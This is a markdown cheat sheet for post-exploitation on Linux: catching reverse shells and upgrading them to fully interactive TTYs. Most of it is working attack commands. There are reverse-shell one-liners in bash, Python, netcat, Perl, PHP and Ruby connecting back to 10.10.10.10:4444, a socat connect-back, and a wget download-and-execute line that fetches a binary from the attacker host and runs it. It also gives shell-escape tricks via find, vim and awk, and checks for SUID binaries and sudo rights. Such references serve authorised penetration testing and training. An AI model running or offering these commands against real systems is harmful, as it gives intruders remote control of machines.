# Linux Shell Upgrade and Stabilization

Upgrade basic reverse shells to fully interactive TTY shells with tab completion, command history, and signal handling.
Proper shell stabilization is critical for effective post-exploitation and prevents accidental disconnections.

## Quick Reference

```bash
# Python PTY upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Socat full TTY (best method)
# Attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```

## Reverse Shell One-Liners

```bash
# Bash TCP
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Netcat
nc -e /bin/sh 10.10.10.10 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f

# Perl
perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Python PTY Upgrade

```bash
# Step 1: Spawn PTY
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background shell (Ctrl+Z)
^Z

# Step 3: Configure terminal
stty raw -echo; fg
# Press Enter twice

# Step 4: Set environment variables
export TERM=xterm
export SHELL=bash

# Step 5: Fix terminal size
stty rows 38 columns 116  # Get values from: stty -a
```

## Socat Full TTY Upgrade

### Method 1: Socat Binary Available

```bash
# Attacker listener
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Victim connection
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```

### Method 2: Transfer Socat Binary

```bash
# Download socat static binary
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat

# Serve from attacker
python3 -m http.server 8000

# Download on victim
wget http://10.10.10.10:8000/socat -O /tmp/socat
chmod +x /tmp/socat

# Connect back
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```

### One-Liner Download and Execute

```bash
wget -q http://10.10.10.10/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```

## Alternative Shell Spawning Methods

```bash
# /bin/sh interactive
/bin/sh -i

# Perl
perl -e 'exec "/bin/sh";'

# Ruby
ruby -e 'exec "/bin/sh"'

# Lua
lua -e 'os.execute("/bin/sh")'

# AWK
awk 'BEGIN {system("/bin/sh")}'

# Find with exec
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit

# VIM
vim -c ':!/bin/sh'
# Or from within vim:
:set shell=/bin/sh
:shell

# Expect
expect -c 'spawn /bin/sh;interact'
```

## rlwrap for Better Netcat Shells

```bash
# Use rlwrap with netcat listener
rlwrap nc -lvnp 4444

# Provides:
# - Command history (up/down arrows)
# - Line editing
# - Tab completion (limited)
```

## Script Command for Logging

```bash
# Start script to log session
script /dev/null -c bash

# Or
script -qc /bin/bash /dev/null
```

## Common Workflow

```bash
# Step 1: Catch reverse shell
nc -lvnp 4444

# Step 2: Upgrade to PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 3: Background and configure
^Z
stty raw -echo; fg
[Enter] [Enter]

# Step 4: Set environment
export TERM=xterm
export SHELL=bash

# Step 5: Fix terminal size (get from local: stty -a)
stty rows 38 columns 116

# Step 6: Test functionality
# - Tab completion
# - Ctrl+C (should work)
# - Command history (up arrow)
# - Clear screen (Ctrl+L)
```

## Notes

**Why Upgrade Shells?**

Basic reverse shells lack:
- Tab completion
- Command history
- Signal handling (Ctrl+C kills shell)
- Proper terminal emulation
- Text editors (vim, nano) don't work properly
- Job control (background processes)

**PTY vs TTY:**

- **PTY (Pseudo-Terminal)**: Software emulation of terminal
- **TTY (Teletypewriter)**: Physical or virtual terminal device
- PTY provides TTY-like functionality in reverse shells

**Socat Advantages:**

- Full terminal emulation
- Signal handling (Ctrl+C, Ctrl+Z)
- Proper terminal size
- Works with interactive programs
- Best method when available

**Terminal Size Issues:**

If terminal size is wrong:
```bash
# On attacker machine
stty -a  # Note rows and columns

# In reverse shell
stty rows <num> columns <num>
```

**Common Issues:**

1. **Shell dies on Ctrl+C**: Not properly upgraded
2. **No tab completion**: PTY not spawned
3. **Weird characters**: TERM not set
4. **Text wrapping issues**: Terminal size not set
5. **Vim/nano broken**: Need full TTY (use socat)

**Best Practices:**

- Always upgrade shells immediately
- Use socat when possible (best stability)
- Set TERM and SHELL variables
- Configure terminal size
- Test tab completion and Ctrl+C
- Keep socat binary in toolkit

**Alternative Tools:**

- **pwncat-cs**: Automated shell upgrade and management
- **rlwrap**: Simple wrapper for better line editing
- **script**: Log session and improve terminal

**Checking Available Interpreters:**

```bash
which python python2 python3
which perl ruby lua
which awk
```

**Permissions Considerations:**

```bash
# Check file permissions
ls -la /path/to/binary

# Check sudo permissions
sudo -l

# Check SUID binaries
find / -perm -4000 2>/dev/null
```

**Resources:**

- [ropnop's Shell Upgrade Guide](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
- [0xffsec Handbook](https://0xffsec.com/handbook/shells/full-tty/)
- [Static Binaries Repository](https://github.com/andrew-d/static-binaries)
